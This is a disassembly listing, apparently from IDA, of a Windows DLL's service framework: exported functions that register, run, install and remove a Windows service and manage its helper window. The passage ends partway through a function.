loc_6AF48F7B:				; CODE XREF: Ordinal1030+5Ej
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		xor	ebx, ebx
		test	eax, eax
		jnz	short loc_6AF49005
		mov	eax, [ebp+arg_4]
		and	[esi+0Ch], ebx
		and	[esi+10h], ebx
		mov	[esi+34h], eax
		mov	eax, [esi+38h]
		lea	edi, [esi+4]
		mov	dword ptr [esi+8], offset loc_6AF48CF0
		add	esi, 160h
		mov	ecx, esi
		mov	[edi], eax
		inc	ebx
		call	Ordinal844
		push	edi		; lpServiceStartTable
		call	StartServiceCtrlDispatcherA
		test	eax, eax
		jnz	short loc_6AF48FD2
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCserviceRegi_1 ; "CService::Register() : StartServiceCtrl"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	ebx, ebx

loc_6AF48FD2:				; CODE XREF: Ordinal1030+13Ej
		mov	ecx, esi
		call	Ordinal845
		test	eax, eax
		jz	short loc_6AF49005
		push	0FFFFFFFFh	; dwMilliseconds
		mov	ecx, esi
		call	Ordinal1118
		push	eax		; hHandle
		call	ds:WaitForSingleObject
		test	eax, eax
		jz	short loc_6AF48FFE
		push	offset aCserviceRegi_2 ; "CService::Register() : WaitForSingleObj"...
		call	sub_6AF3102E
		pop	ecx
		xor	ebx, ebx

loc_6AF48FFE:				; CODE XREF: Ordinal1030+172j
		mov	ecx, esi
		call	Ordinal844

loc_6AF49005:				; CODE XREF: Ordinal1030+10Aj
					; Ordinal1030+15Ej
		lea	ecx, [ebp+var_48]
		call	Ordinal752
		mov	eax, ebx

loc_6AF4900F:				; CODE XREF: Ordinal1030+39j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal1030	endp ; sp-analysis failed

; Exported entry 1050.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1050
Ordinal1050	proc near		; CODE XREF: Ordinal1072+3Fp
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal901
		and	dword ptr [esi+1A0h], 0
		mov	dword ptr [esi], offset	off_6AF5DD58
		mov	eax, esi
		pop	esi
		retn
Ordinal1050	endp

; Exported entry 1051.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1051
Ordinal1051	proc near		; CODE XREF: Ordinal1073+25p
					; sub_6AF49358+3p
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5DD58
		jmp	Ordinal902
Ordinal1051	endp

; Exported entry 1052.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1052
Ordinal1052	proc near		; CODE XREF: Ordinal1096+Dp
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		push	1		; dwMode
		push	1		; int
		push	0		; int
		mov	[ecx+1A0h], eax
		call	Ordinal480
		retn	4
Ordinal1052	endp

; Exported entry 1053.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1053
Ordinal1053	proc near		; DATA XREF: .rdata:6AF5DD84o
					; .rdata:off_6AF66098o
		mov	ecx, [ecx+1A0h]
		mov	eax, [ecx]
		call	dword ptr [eax+48h]
		xor	eax, eax
		inc	eax
		retn
Ordinal1053	endp

; Exported entry 1054.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1054
Ordinal1054	proc near		; CODE XREF: Ordinal1101+23p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal852
		and	dword ptr [esi+48h], 0
		mov	dword ptr [esi], offset	off_6AF5DD98
		mov	eax, esi
		pop	esi
		retn
Ordinal1054	endp

; Exported entry 1055.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1055
Ordinal1055	proc near		; CODE XREF: sub_6AF49374+3p
					; Ordinal1101+C0p
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5DD98
		jmp	Ordinal853
Ordinal1055	endp

; Exported entry 1057.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1057
Ordinal1057	proc near		; DATA XREF: .rdata:6AF5DDB0o
					; .rdata:off_6AF66098o
		mov	ecx, [ecx+48h]
		mov	eax, [ecx]
		jmp	dword ptr [eax+48h]
Ordinal1057	endp

; Exported entry 1059.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1059
Ordinal1059	proc near		; DATA XREF: .rdata:6AF5DDB8o
					; .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		cmp	[esp+arg_0], 0
		push	esi
		mov	esi, ecx
		jz	short loc_6AF490FA
		cmp	[esp+4+arg_4], 0
		jz	short loc_6AF490FA
		push	offset aCservicewindow ; "CServiceWindow::OnEndSession() : m_pSer"...
		call	sub_6AF31006
		pop	ecx
		mov	ecx, [esi+48h]
		mov	eax, [ecx]
		call	dword ptr [eax+48h]
		push	offset aCservicewind_0 ; "CServiceWindow::OnEndSession() : WaitFo"...
		call	sub_6AF31006
		pop	ecx
		push	0FFFFFFFFh
		mov	ecx, esi
		call	Ordinal1387
		push	offset aCservicewind_1 ; "CServiceWindow::OnEndSession() : ExitIn"...
		call	sub_6AF31006
		mov	eax, [esi]
		pop	ecx
		mov	ecx, esi
		call	dword ptr [eax+14h]
		push	offset aCservicewind_2 ; "CServiceWindow::OnEndSession() : _endth"...
		call	sub_6AF31006
		push	0
		call	ds:_endthreadex
		pop	ecx
		pop	ecx

loc_6AF490FA:				; CODE XREF: Ordinal1059+8j
					; Ordinal1059+Fj
		pop	esi
		retn	8
Ordinal1059	endp

; Exported entry 1061.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1061
Ordinal1061	proc near		; CODE XREF: sub_6AF493A6+3p
					; sub_6AF53491+3j
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5DEA0
		jmp	Ordinal891
Ordinal1061	endp

; Exported entry 851.
; Exported entry 1065.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1065
Ordinal1065	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		cmp	[esp+arg_0], 0	; ccL30_851
		push	esi
		mov	esi, ecx
		jz	short loc_6AF4911C
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF49145

loc_6AF4911C:				; CODE XREF: Ordinal1065+8j
		push	edi
		xor	edi, edi
		inc	edi
		cmp	[esp+8+arg_0], 0
		jnz	short loc_6AF4912D
		and	dword ptr [esi+8], 0
		jmp	short loc_6AF49142
; ---------------------------------------------------------------------------

loc_6AF4912D:				; CODE XREF: Ordinal1065+1Cj
		push	offset aImmdisableime ;	"ImmDisableIME"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF49142
		xor	edi, edi

loc_6AF49142:				; CODE XREF: Ordinal1065+22j
					; Ordinal1065+35j
		mov	eax, edi
		pop	edi

loc_6AF49145:				; CODE XREF: Ordinal1065+11j
		pop	esi
		retn	4
Ordinal1065	endp

; Exported entry 1067.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1067
Ordinal1067	proc near		; CODE XREF: sub_6AF493D8+3p
					; Ordinal1101+C8p
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5DEA4
		jmp	Ordinal891
Ordinal1067	endp

; Exported entry 1071.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1071
Ordinal1071	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		cmp	[esp+arg_0], 0
		push	esi
		mov	esi, ecx
		jz	short loc_6AF49167
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF49190

loc_6AF49167:				; CODE XREF: Ordinal1071+8j
		push	edi
		xor	edi, edi
		inc	edi
		cmp	[esp+8+arg_0], 0
		jnz	short loc_6AF49178
		and	dword ptr [esi+8], 0
		jmp	short loc_6AF4918D
; ---------------------------------------------------------------------------

loc_6AF49178:				; CODE XREF: Ordinal1071+1Cj
		push	offset aRegisterserv_1 ; "RegisterServiceProcess"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF4918D
		xor	edi, edi

loc_6AF4918D:				; CODE XREF: Ordinal1071+22j
					; Ordinal1071+35j
		mov	eax, edi
		pop	edi

loc_6AF49190:				; CODE XREF: Ordinal1071+11j
		pop	esi
		retn	4
Ordinal1071	endp

; Exported entry 1072.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1072
Ordinal1072	proc near		; CODE XREF: Ordinal463+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal1028
		and	dword ptr [esi+168h], 0
		and	dword ptr [esi+16Ch], 0
		and	dword ptr [esi+170h], 0
		lea	ecx, [esi+174h]
		mov	dword ptr [esi], offset	off_6AF5DEC0
		call	Ordinal1313
		lea	ecx, [esi+17Ch]
		call	Ordinal1302
		lea	ecx, [esi+184h]
		call	Ordinal1050
		lea	ecx, [esi+328h]
		call	Ordinal705
		lea	ecx, [esi+36Ch]
		call	Ordinal501
		and	dword ptr [esi+39Ch], 0
		mov	dword ptr [esi+3A0h], 3
		mov	eax, esi
		pop	esi
		retn
Ordinal1072	endp

; Exported entry 1073.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1073
Ordinal1073	proc near		; CODE XREF: Ordinal464+6j
					; sub_6AF49476+3p
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+36Ch]
		mov	dword ptr [esi], offset	off_6AF5DEC0
		call	Ordinal502
		lea	ecx, [esi+328h]
		call	Ordinal706
		lea	ecx, [esi+184h]
		call	Ordinal1051
		lea	ecx, [esi+17Ch]
		call	Ordinal1304
		lea	ecx, [esi+174h]
		call	Ordinal1315
		mov	ecx, esi
		pop	esi
		jmp	Ordinal1029
Ordinal1073	endp

; Exported entry 1078.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1078
Ordinal1078	proc near		; DATA XREF: .rdata:6AF590B4o
					; .rdata:6AF5DF04o ...

arg_0		= dword	ptr  4

		mov	eax, ecx
		push	dword ptr [eax+39Ch]
		lea	ecx, [eax+174h]
		push	[esp+4+arg_0]
		mov	edx, [ecx]
		call	dword ptr [edx+4]
		retn	4
Ordinal1078	endp

; Exported entry 1079.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1079
Ordinal1079	proc near		; DATA XREF: .rdata:6AF590B8o
					; .rdata:6AF5DF08o ...
		add	ecx, 174h
		jmp	Ordinal1322
Ordinal1079	endp

; Exported entry 1080.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1080
Ordinal1080	proc near		; DATA XREF: .rdata:6AF590BCo
					; .rdata:6AF5DF0Co ...
		xor	eax, eax
		inc	eax
		retn	4
Ordinal1080	endp

; Exported entry 1081.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1081
Ordinal1081	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+168h]
		retn
Ordinal1081	endp

; Exported entry 1082.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1082
Ordinal1082	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+16Ch]
		retn
Ordinal1082	endp

; Exported entry 1083.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1083
Ordinal1083	proc near		; CODE XREF: Ordinal1074+2FCp
					; DATA XREF: .rdata:off_6AF66098o
		add	ecx, 174h
		mov	eax, [ecx]
		push	0
		push	0
		call	dword ptr [eax+4]
		retn
Ordinal1083	endp

; Exported entry 1084.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1084
Ordinal1084	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+170h]
		retn
Ordinal1084	endp

; Exported entry 1085.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1085
Ordinal1085	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	[ecx+39Ch], eax
		retn	4
Ordinal1085	endp

; Exported entry 1086.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1086
Ordinal1086	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+39Ch]
		retn
Ordinal1086	endp

; Exported entry 1087.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1087
Ordinal1087	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	[ecx+3A0h], eax
		retn	4
Ordinal1087	endp

; Exported entry 1088.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1088
Ordinal1088	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+3A0h]
		retn
Ordinal1088	endp

; Exported entry 1090.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1090
Ordinal1090	proc near		; DATA XREF: .rdata:6AF590C4o
					; .rdata:6AF5DF14o ...
		mov	eax, [ecx]
		call	dword ptr [eax+48h]
		xor	eax, eax
		retn
Ordinal1090	endp

; Exported entry 492.
; Exported entry 1091.
; Exported entry 1097.
; Exported entry 1289.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1091
Ordinal1091	proc near		; DATA XREF: .rdata:6AF590C8o
					; .rdata:6AF590CCo ...
		xor	eax, eax	; ccL30_492
					; ccL30_1091
					; ccL30_1097
		retn
Ordinal1091	endp

; Exported entry 1089.
; Exported entry 1092.
; Exported entry 1093.
; Exported entry 1094.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1094
Ordinal1094	proc near		; DATA XREF: .rdata:6AF590C0o
					; .rdata:6AF5DF10o ...
		or	eax, 0FFFFFFFFh	; ccL30_1089
					; ccL30_1092
					; ccL30_1093
		retn
Ordinal1094	endp

; Exported entry 1096.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1096
Ordinal1096	proc near		; CODE XREF: Ordinal473+1Fj
					; DATA XREF: .rdata:6AF5DF34o ...
		push	esi
		mov	esi, ecx
		push	edi
		lea	edi, [esi+184h]
		push	esi
		mov	ecx, edi
		call	Ordinal1052
		test	eax, eax
		jnz	short loc_6AF492F8
		push	offset aCserviceappOnr ; "CServiceApp::OnRunDebug() : m_Console.C"...
		call	sub_6AF3102E
		pop	ecx
		or	eax, 0FFFFFFFFh
		jmp	short loc_6AF49345
; ---------------------------------------------------------------------------

loc_6AF492F8:				; CODE XREF: Ordinal1096+14j
		push	ebx		; Args
		mov	ecx, edi
		lea	ebx, [esi+36Ch]
		call	Ordinal484
		push	eax
		mov	ecx, ebx
		call	Ordinal512
		mov	ecx, edi
		call	Ordinal483
		push	eax		; Src
		mov	ecx, ebx
		call	Ordinal527
		push	offset aCserviceappO_0 ; "CServiceApp::OnRunDebug() : Start()\n"
		mov	dword ptr [esi+168h], 1
		call	sub_6AF31006
		mov	eax, [esi]
		pop	ecx
		mov	ecx, esi
		call	dword ptr [eax+4]
		mov	ecx, edi
		mov	esi, eax
		call	Ordinal481
		mov	eax, esi
		pop	ebx

loc_6AF49345:				; CODE XREF: Ordinal1096+24j
		pop	edi
		pop	esi
		retn
Ordinal1096	endp

; Exported entry 1100.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1100
Ordinal1100	proc near		; DATA XREF: .rdata:6AF59078o
					; .rdata:6AF5DEC8o ...
		push	esi
		mov	esi, ecx
		call	Ordinal1034
		mov	eax, [esi]
		mov	ecx, esi
		pop	esi
		jmp	dword ptr [eax+48h]
Ordinal1100	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF49358(void *, char)
sub_6AF49358	proc near		; DATA XREF: .rdata:off_6AF5DD58o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1051
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4936E
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4936E:				; CODE XREF: sub_6AF49358+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF49358	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF49374(void *, char)
sub_6AF49374	proc near		; DATA XREF: .rdata:off_6AF5DD98o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1055
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4938A
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4938A:				; CODE XREF: sub_6AF49374+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF49374	endp

; Exported entry 1060.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1060
Ordinal1060	proc near		; CODE XREF: Ordinal1074+26p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal889
		and	dword ptr [esi+8], 0
		mov	dword ptr [esi], offset	off_6AF5DEA0
		mov	eax, esi
		pop	esi
		retn
Ordinal1060	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF493A6(void *, char)
sub_6AF493A6	proc near		; DATA XREF: .rdata:off_6AF5DEA0o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1061
		test	[esp+4+arg_0], 1
		jz	short loc_6AF493BC
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF493BC:				; CODE XREF: sub_6AF493A6+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF493A6	endp

; Exported entry 1066.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1066
Ordinal1066	proc near		; CODE XREF: Ordinal1101+1Bp
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal889
		and	dword ptr [esi+8], 0
		mov	dword ptr [esi], offset	off_6AF5DEA4
		mov	eax, esi
		pop	esi
		retn
Ordinal1066	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF493D8(void *, char)
sub_6AF493D8	proc near		; DATA XREF: .rdata:off_6AF5DEA4o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1067
		test	[esp+4+arg_0], 1
		jz	short loc_6AF493EE
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF493EE:				; CODE XREF: sub_6AF493D8+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF493D8	endp

; Exported entry 1068.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1068(LPCSTR Args)
		public Ordinal1068
Ordinal1068	proc near		; CODE XREF: Ordinal1101+42p
					; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4

		push	esi
		push	[esp+4+Args]	; Args
		mov	esi, ecx
		call	Ordinal896
		test	eax, eax
		jz	short loc_6AF4940F
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF49413

loc_6AF4940F:				; CODE XREF: Ordinal1068+Ej
		xor	eax, eax
		jmp	short loc_6AF4942F
; ---------------------------------------------------------------------------

loc_6AF49413:				; CODE XREF: Ordinal1068+19j
		push	edi
		xor	edi, edi
		push	offset aRegisterserv_1 ; "RegisterServiceProcess"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF4942C
		xor	edi, edi

loc_6AF4942C:				; CODE XREF: Ordinal1068+34j
		mov	eax, edi
		pop	edi

loc_6AF4942F:				; CODE XREF: Ordinal1068+1Dj
		pop	esi
		retn	4
Ordinal1068	endp

; Exported entry 1069.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1069(LPCSTR Args, DWORD dwFlags)
		public Ordinal1069
Ordinal1069	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4
dwFlags		= dword	ptr  8

		push	esi
		push	[esp+4+dwFlags]	; dwFlags
		mov	esi, ecx
		push	[esp+8+Args]	; Args
		call	Ordinal897
		test	eax, eax
		jz	short loc_6AF49452
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF49456

loc_6AF49452:				; CODE XREF: Ordinal1069+12j
		xor	eax, eax
		jmp	short loc_6AF49472
; ---------------------------------------------------------------------------

loc_6AF49456:				; CODE XREF: Ordinal1069+1Dj
		push	edi
		xor	edi, edi
		push	offset aRegisterserv_1 ; "RegisterServiceProcess"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF4946F
		xor	edi, edi

loc_6AF4946F:				; CODE XREF: Ordinal1069+38j
		mov	eax, edi
		pop	edi

loc_6AF49472:				; CODE XREF: Ordinal1069+21j
		pop	esi
		retn	8
Ordinal1069	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF49476(void *, char)
sub_6AF49476	proc near		; DATA XREF: .rdata:off_6AF5DEC0o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1073
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4948C
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4948C:				; CODE XREF: sub_6AF49476+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF49476	endp

; Exported entry 1075.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1075
Ordinal1075	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		xor	eax, eax
		cmp	[ecx+16Ch], eax
		jz	short locret_6AF494AD
		push	eax
		push	eax
		push	[esp+8+arg_4]
		push	[esp+0Ch+arg_0]
		push	2
		call	Ordinal1033

locret_6AF494AD:			; CODE XREF: Ordinal1075+8j
		retn	8
Ordinal1075	endp

; Exported entry 1076.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1076
Ordinal1076	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		cmp	[ecx+16Ch], eax
		jz	short locret_6AF494C5
		push	eax
		push	eax
		push	eax
		push	eax
		push	4
		call	Ordinal1033

locret_6AF494C5:			; CODE XREF: Ordinal1076+8j
		retn
Ordinal1076	endp

; Exported entry 1077.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1077
Ordinal1077	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		xor	eax, eax
		cmp	[ecx+16Ch], eax
		jz	short locret_6AF494E1
		push	eax
		push	eax
		push	[esp+8+arg_4]
		push	[esp+0Ch+arg_0]
		push	3
		call	Ordinal1033

locret_6AF494E1:			; CODE XREF: Ordinal1077+8j
		retn	8
Ordinal1077	endp

; Exported entry 1098.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1098
Ordinal1098	proc near		; CODE XREF: Ordinal470+44p
					; DATA XREF: .rdata:6AF5DF2Co ...

var_50		= byte ptr -50h
var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 50h
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+3Ch]
		call	Ordinal942
		test	eax, eax
		jz	short loc_6AF49541
		push	dword ptr [esi+38h] ; lpServiceName
		mov	ecx, esi
		call	Ordinal1032
		mov	eax, [esi+38h]
		xor	ecx, ecx
		push	ecx
		push	ecx
		push	ecx
		push	offset aRpcss	; "RPCSS"
		push	2
		push	[ebp+arg_4]
		mov	ecx, esi
		push	[ebp+arg_0]
		push	eax
		call	Ordinal1031
		test	eax, eax
		jnz	short loc_6AF49534
		push	offset aCserviceappOni ; "CServiceApp::OnInstallService() : Insta"...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF495D1
; ---------------------------------------------------------------------------

loc_6AF49534:				; CODE XREF: Ordinal1098+3Ej
		lea	ecx, [esi+328h]
		call	Ordinal730
		jmp	short loc_6AF495B2
; ---------------------------------------------------------------------------

loc_6AF49541:				; CODE XREF: Ordinal1098+13j
		lea	ecx, [ebp+var_50]
		call	Ordinal1163
		push	0		; Filename
		lea	ecx, [ebp+var_50]
		call	Ordinal1165
		test	eax, eax
		jnz	short loc_6AF49564
		push	offset aCserviceappO_1 ; "CServiceApp::OnInstallService() : path."...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF495C9
; ---------------------------------------------------------------------------

loc_6AF49564:				; CODE XREF: Ordinal1098+71j
		lea	ecx, [ebp+var_C]
		call	Ordinal988
		push	1		; int
		push	20006h		; samDesired
		push	offset aSoftwareMicr_1 ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
		push	80000002h	; hKey
		lea	ecx, [ebp+var_C]
		call	Ordinal993
		test	eax, eax
		jz	short loc_6AF495B6
		mov	esi, [esi+38h]
		lea	ecx, [ebp+var_50]
		call	Ordinal1178
		push	eax		; lpData
		push	esi		; lpValueName
		lea	ecx, [ebp+var_C]
		call	Ordinal1004
		test	eax, eax
		jz	short loc_6AF495B6
		lea	ecx, [ebp+var_C]
		call	Ordinal990
		lea	ecx, [ebp+var_50]
		call	Ordinal1164

loc_6AF495B2:				; CODE XREF: Ordinal1098+5Bj
		xor	eax, eax
		jmp	short loc_6AF495D4
; ---------------------------------------------------------------------------

loc_6AF495B6:				; CODE XREF: Ordinal1098+A3j
					; Ordinal1098+BCj
		push	offset aCserviceappO_2 ; "CServiceApp::OnInstallService() : reg.S"...
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [ebp+var_C]
		call	Ordinal990

loc_6AF495C9:				; CODE XREF: Ordinal1098+7Ej
		lea	ecx, [ebp+var_50]
		call	Ordinal1164

loc_6AF495D1:				; CODE XREF: Ordinal1098+4Bj
		or	eax, 0FFFFFFFFh

loc_6AF495D4:				; CODE XREF: Ordinal1098+D0j
		pop	esi
		leave
		retn	8
Ordinal1098	endp

; Exported entry 1099.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1099
Ordinal1099	proc near		; CODE XREF: Ordinal471+1Fj
					; DATA XREF: .rdata:6AF5DF30o ...

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+3Ch]
		call	Ordinal942
		test	eax, eax
		jz	short loc_6AF49616
		push	dword ptr [esi+38h] ; lpServiceName
		mov	ecx, esi
		call	Ordinal1032
		test	eax, eax
		jnz	short loc_6AF49609
		push	offset aCserviceappO_3 ; "CServiceApp::OnRemoveService() : Remove"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF49669
; ---------------------------------------------------------------------------

loc_6AF49609:				; CODE XREF: Ordinal1099+21j
		lea	ecx, [esi+328h]
		call	Ordinal731
		jmp	short loc_6AF49652
; ---------------------------------------------------------------------------

loc_6AF49616:				; CODE XREF: Ordinal1099+13j
		lea	ecx, [ebp+var_C]
		call	Ordinal988
		push	1		; int
		push	20006h		; samDesired
		push	offset aSoftwareMicr_1 ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
		push	80000002h	; hKey
		lea	ecx, [ebp+var_C]
		call	Ordinal993
		test	eax, eax
		jz	short loc_6AF49656
		push	dword ptr [esi+38h] ; lpValueName
		lea	ecx, [ebp+var_C]
		call	Ordinal1000
		test	eax, eax
		jz	short loc_6AF49656
		lea	ecx, [ebp+var_C]
		call	Ordinal990

loc_6AF49652:				; CODE XREF: Ordinal1099+3Bj
		xor	eax, eax
		jmp	short loc_6AF4966C
; ---------------------------------------------------------------------------

loc_6AF49656:				; CODE XREF: Ordinal1099+60j
					; Ordinal1099+6Fj
		push	offset aCserviceappO_4 ; "CServiceApp::OnRemoveService() : reg.De"...
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [ebp+var_C]
		call	Ordinal990

loc_6AF49669:				; CODE XREF: Ordinal1099+2Ej
		or	eax, 0FFFFFFFFh

loc_6AF4966C:				; CODE XREF: Ordinal1099+7Bj
		pop	esi
		leave
		retn
Ordinal1099	endp

; Exported entry 1056.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1056
Ordinal1056	proc near		; CODE XREF: Ordinal1101+7Ap
					; DATA XREF: .rdata:off_6AF66098o

var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_102	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, ecx
		mov	[ebp+var_14], eax
		mov	eax, [ebp+arg_0]
		push	edi
		lea	ecx, [ebp+arg_0]
		mov	[ebp+var_10], esp
		mov	[ebp+var_28], esi
		mov	[esi+48h], eax
		call	sub_6AF318C3
		and	[ebp+var_4], 0
		push	offset aCservicewind_3 ; "CServiceWindow::Create()"
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		mov	eax, [esi+48h]
		add	eax, 38h
		push	eax
		lea	ecx, [ebp+arg_0]
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF31C41
		push	offset a_window_class ;	"_Window_Class"
		lea	ecx, [ebp+arg_0]
		call	sub_6AF3B24F
		jmp	loc_6AF4976E
; ---------------------------------------------------------------------------

loc_6AF496D3:				; DATA XREF: .rdata:6AF63B88o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
